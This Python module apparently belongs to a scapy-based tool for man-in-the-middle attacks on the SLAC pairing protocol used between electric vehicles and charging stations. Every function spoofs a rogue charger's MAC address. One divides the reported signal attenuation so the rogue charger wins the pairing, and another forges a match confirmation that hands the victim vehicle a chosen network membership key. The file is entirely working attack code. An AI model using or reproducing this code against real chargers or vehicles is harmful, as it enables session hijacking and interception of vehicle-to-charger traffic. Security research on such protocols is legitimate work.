from scapy.all import Ether
from scapy.contrib.homepluggp import CM_ATTEN_CHAR_IND, CM_SLAC_PARM_CNF, CM_SLAC_MATCH_CNF
from general_simulate_packets import send_packet, str_with_colon_to_bytes, str_to_bytes

ATTENUATION_DIVISOR = 2

def duplicate_cm_slac_parm_cnf(packet, sending_interface, mitm_evse_mac):
    if packet.haslayer(Ether) and packet.haslayer(CM_SLAC_PARM_CNF):
         packet[Ether].src = mitm_evse_mac
         send_packet(packet, sending_interface)

def duplicate_cm_atten_char_ind(packet, sending_interface, mitm_evse_mac):
    if packet.haslayer(Ether) and packet.haslayer(CM_ATTEN_CHAR_IND):
        packet[Ether].src = mitm_evse_mac
        att_groups = packet[CM_ATTEN_CHAR_IND].Groups
        for group in att_groups:
            att = group.group
            group.group = att // ATTENUATION_DIVISOR
        send_packet(packet, sending_interface)

def duplicate_cm_slac_match_cnf(packet, sending_interface, mitm_evse_mac, mitm_evse_id, original_ev_id, original_ev_mac, run_id, network_id, network_membership_key):
    if packet.haslayer(Ether) and packet.haslayer(CM_SLAC_MATCH_CNF):
        packet[Ether].src = mitm_evse_mac
        packet[Ether].dst = original_ev_mac
        packet[CM_SLAC_MATCH_CNF].VariableField.EVID = original_ev_id
        packet[CM_SLAC_MATCH_CNF].VariableField.EVMAC = original_ev_mac
        packet[CM_SLAC_MATCH_CNF].VariableField.EVSEID = mitm_evse_id
        packet[CM_SLAC_MATCH_CNF].VariableField.EVSEMAC = mitm_evse_mac
        packet[CM_SLAC_MATCH_CNF].VariableField.RunID = run_id
        packet[CM_SLAC_MATCH_CNF].VariableField.NetworkID = str_with_colon_to_bytes(network_id)
        packet[CM_SLAC_MATCH_CNF].VariableField.NMK = str_to_bytes(network_membership_key)
        send_packet(packet, sending_interface)